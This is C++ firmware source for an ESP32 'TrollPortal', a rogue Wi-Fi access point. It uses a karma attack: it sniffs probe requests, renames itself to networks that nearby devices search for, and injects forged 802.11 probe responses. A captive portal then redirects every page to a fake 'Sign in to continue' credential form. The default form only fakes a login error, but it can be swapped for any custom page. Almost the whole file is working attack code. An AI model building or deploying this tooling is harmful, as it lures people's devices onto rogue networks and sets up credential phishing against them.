#include "TrollPortal.h"
#include <WiFi.h>
#include <LittleFS.h>
#include <esp_wifi.h>
#include <string.h>

static constexpr const char* TROLL_HTML_PATH = "/web/troll.html";
static constexpr const char* TROLL_IP        = "192.168.4.1";
static constexpr uint8_t     TROLL_CHANNEL   = 6;

TrollPortal* TrollPortal::_instance = nullptr;

static const char DEFAULT_TROLL_HTML[] PROGMEM = R"rawhtml(<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:12px;box-shadow:0 2px 16px rgba(0,0,0,.12);
padding:36px 32px;max-width:380px;width:100%}
.logo{text-align:center;margin-bottom:24px}
.logo svg{width:48px;height:48px}
h1{font-size:1.2rem;font-weight:600;color:#111;text-align:center;margin-bottom:4px}
.sub{font-size:.82rem;color:#888;text-align:center;margin-bottom:28px}
label{display:block;font-size:.8rem;font-weight:500;color:#444;margin-bottom:6px}
input{width:100%;padding:11px 14px;border:1px solid #ddd;border-radius:8px;
font-size:.9rem;color:#111;outline:none;transition:border .15s}
input:focus{border-color:#2563eb}
.field{margin-bottom:16px}
.btn{width:100%;padding:12px;background:#2563eb;color:#fff;border:none;border-radius:8px;
font-size:.95rem;font-weight:600;cursor:pointer;margin-top:8px;transition:background .15s}
.btn:hover{background:#1d4ed8}
.btn:disabled{background:#93c5fd;cursor:default}
.error{font-size:.78rem;color:#dc2626;margin-top:10px;text-align:center;min-height:18px}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.4);
border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;
vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}
.edu{font-size:.65rem;color:#bbb;text-align:center;margin-top:28px}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<svg viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
<path d="M5 12.55a11 11 0 0 1 14 0"/>
<path d="M1.42 9a16 16 0 0 1 21.16 0"/>
<path d="M8.53 16.11a6 6 0 0 1 6.95 0"/>
<circle cx="12" cy="20" r="1" fill="#2563eb" stroke="none"/>
</svg>
</div>
<h1>Sign in to continue</h1>
<p class="sub">Enter your credentials to access the network</p>
<form id="form" novalidate>
<div class="field">
<label for="usr">Username</label>
<input id="usr" type="text" autocomplete="username" placeholder="username" spellcheck="false">
</div>
<div class="field">
<label for="pwd">Password</label>
<input id="pwd" type="password" autocomplete="current-password" placeholder="••••••••">
</div>
<button class="btn" id="btn" type="submit">Sign In</button>
<div class="error" id="err"></div>
</form>
<p class="edu">For educational &amp; demonstration purposes only</p>
</div>
<script>
var form=document.getElementById('form'),btn=document.getElementById('btn'),err=document.getElementById('err');
form.addEventListener('submit',function(e){
e.preventDefault();err.textContent='';btn.disabled=true;
btn.innerHTML='<span class="spinner"></span>Verifying…';
setTimeout(function(){btn.disabled=false;btn.textContent='Sign In';
err.textContent='Incorrect username or password. Please try again.';},2200);
});
</script>
</body>
</html>)rawhtml";

// ── Public API ────────────────────────────────────────────────────────────────

void TrollPortal::setSSIDs(const std::vector<String>& ssids) {
    _ssidCount = 0;
    for (const auto& s : ssids) {
        if (_ssidCount >= MAX_SSIDS) break;
        if (s.isEmpty() || s.length() > 32) continue;
        strncpy(_ssids[_ssidCount], s.c_str(), 32);
        _ssids[_ssidCount][32] = '\0';
        _ssidCount++;
    }
}

bool TrollPortal::begin(const String& apSsid) {
    if (_running) return true;
    if (apSsid.isEmpty()) return false;

    _mux = portMUX_INITIALIZER_UNLOCKED;
    _pendingProbe = false;
    _instance = this;

    WiFi.mode(WIFI_AP_STA);
    if (!WiFi.softAP(apSsid.c_str(), nullptr, TROLL_CHANNEL)) {
        Serial.println("[TrollPortal] softAP failed");
        _instance = nullptr;
        return false;
    }

    IPAddress ip(192, 168, 4, 1);
    WiFi.softAPConfig(ip, ip, IPAddress(255, 255, 255, 0));

    esp_wifi_get_mac(WIFI_IF_AP, _apBssid);

    if (_ssidCount > 0) {
        wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous_rx_cb(probeCallback);
        esp_wifi_set_promiscuous(true);
        Serial.printf("[TrollPortal] karma active — watching %d SSIDs\n", _ssidCount);
    }

    _dns.start(53, "*", ip);
    setupRoutes();
    _server.begin();
    _running = true;
    Serial.printf("[TrollPortal] started: %s\n", apSsid.c_str());
    return true;
}

void TrollPortal::stop() {
    if (!_running) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    _server.stop();
    _dns.stop();
    WiFi.softAPdisconnect(true);
    _instance = nullptr;
    _running = false;
    Serial.println("[TrollPortal] stopped");
}

void TrollPortal::update() {
    if (!_running) return;
    _dns.processNextRequest();
    _server.handleClient();

    // Consume any karma match written by the WiFi callback
    bool pending = false;
    char ssid[33];
    uint8_t dest[6];
    uint8_t ssidLen = 0;

    portENTER_CRITICAL(&_mux);
    if (_pendingProbe) {
        pending = true;
        memcpy(ssid, _pendingSsid, 33);
        memcpy(dest, _pendingDest, 6);
        ssidLen = _pendingLen;
        _pendingProbe = false;
    }
    portEXIT_CRITICAL(&_mux);

    if (pending) {
        changeApSsid(ssid, ssidLen);
        injectProbeResponse(dest, ssid, ssidLen);
    }
}

bool TrollPortal::isRunning() const {
    return _running;
}

// ── Karma probe sniffer (runs in WiFi task context) ───────────────────────────

void IRAM_ATTR TrollPortal::probeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT || !_instance) return;

    const auto*    pkt   = reinterpret_cast<const wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* frame = pkt->payload;
    uint16_t       flen  = pkt->rx_ctrl.sig_len;

    // Frame control byte 0: probe request = 0x40
    if (flen < 28 || frame[0] != 0x40) return;

    // IE SSID starts at offset 24 (802.11 fixed mgmt header = 24 bytes)
    if (frame[24] != 0x00) return;   // tag 0 = SSID
    uint8_t ieLen = frame[25];
    if (ieLen == 0 || (uint16_t)(26 + ieLen) > flen) return;  // wildcard or truncated

    const char* probed = reinterpret_cast<const char*>(frame + 26);

    for (int i = 0; i < _instance->_ssidCount; i++) {
        uint8_t stored = (uint8_t)strlen(_instance->_ssids[i]);
        if (stored == ieLen && memcmp(_instance->_ssids[i], probed, ieLen) == 0) {
            portENTER_CRITICAL_ISR(&_instance->_mux);
            if (!_instance->_pendingProbe) {
                memcpy(_instance->_pendingSsid, probed, ieLen);
                _instance->_pendingSsid[ieLen] = '\0';
                memcpy(_instance->_pendingDest, frame + 10, 6);  // SA offset in mgmt header
                _instance->_pendingLen  = ieLen;
                _instance->_pendingProbe = true;
            }
            portEXIT_CRITICAL_ISR(&_instance->_mux);
            break;
        }
    }
}

// ── Private helpers ───────────────────────────────────────────────────────────

void TrollPortal::changeApSsid(const char* ssid, uint8_t ssidLen) {
    wifi_config_t conf;
    memset(&conf, 0, sizeof(conf));
    memcpy(conf.ap.ssid, ssid, ssidLen);
    conf.ap.ssid_len      = ssidLen;
    conf.ap.channel       = TROLL_CHANNEL;
    conf.ap.authmode      = WIFI_AUTH_OPEN;
    conf.ap.max_connection = 4;
    esp_wifi_set_config(WIFI_IF_AP, &conf);
    Serial.printf("[TrollPortal] karma -> %.*s\n", ssidLen, ssid);
}

void TrollPortal::injectProbeResponse(const uint8_t* dest, const char* ssid, uint8_t ssidLen) {
    // 802.11 probe response frame
    // Header: FC(2)+Dur(2)+DA(6)+SA(6)+BSSID(6)+SeqCtrl(2) = 24
    // Body:   Timestamp(8)+BeaconInt(2)+Capability(2)        = 12
    // IEs:    SSID(2+N)+SupportedRates(10)+DSParam(3)        = 15+N
    // Max total with 32-byte SSID = 51+32 = 83, fits in 128
    uint8_t frame[128];
    memset(frame, 0, sizeof(frame));
    uint8_t pos = 0;

    // Frame Control: probe response
    frame[pos++] = 0x50; frame[pos++] = 0x00;
    // Duration
    frame[pos++] = 0x00; frame[pos++] = 0x00;
    // DA
    memcpy(frame + pos, dest,     6); pos += 6;
    // SA = our BSSID
    memcpy(frame + pos, _apBssid, 6); pos += 6;
    // BSSID = our BSSID
    memcpy(frame + pos, _apBssid, 6); pos += 6;
    // Sequence control
    frame[pos++] = 0x00; frame[pos++] = 0x00;

    // Timestamp (zeroed)
    pos += 8;
    // Beacon interval: 100 TU
    frame[pos++] = 0x64; frame[pos++] = 0x00;
    // Capability: ESS + Short Preamble
    frame[pos++] = 0x01; frame[pos++] = 0x04;

    // SSID IE
    frame[pos++] = 0x00;
    frame[pos++] = ssidLen;
    memcpy(frame + pos, ssid, ssidLen); pos += ssidLen;

    // Supported Rates IE (1, 2, 5.5, 11, 18, 24, 36, 54 Mbps)
    frame[pos++] = 0x01; frame[pos++] = 0x08;
    frame[pos++] = 0x82; frame[pos++] = 0x84;
    frame[pos++] = 0x8b; frame[pos++] = 0x96;
    frame[pos++] = 0x24; frame[pos++] = 0x30;
    frame[pos++] = 0x48; frame[pos++] = 0x6c;

    // DS Parameter Set IE
    frame[pos++] = 0x03; frame[pos++] = 0x01;
    frame[pos++] = TROLL_CHANNEL;

    esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false);
}

void TrollPortal::setupRoutes() {
    _server.on("/", HTTP_GET, [this]() {
        File f = LittleFS.open(TROLL_HTML_PATH, "r");
        if (f && !f.isDirectory()) {
            _server.streamFile(f, "text/html");
            f.close();
        } else {
            _server.send_P(200, "text/html", DEFAULT_TROLL_HTML);
        }
    });

    // Redirect all captive-portal detection URLs (iOS, Android, Windows)
    _server.onNotFound([this]() {
        _server.sendHeader("Location", "http://" + String(TROLL_IP) + "/");
        _server.send(302, "text/plain", "");
    });
}
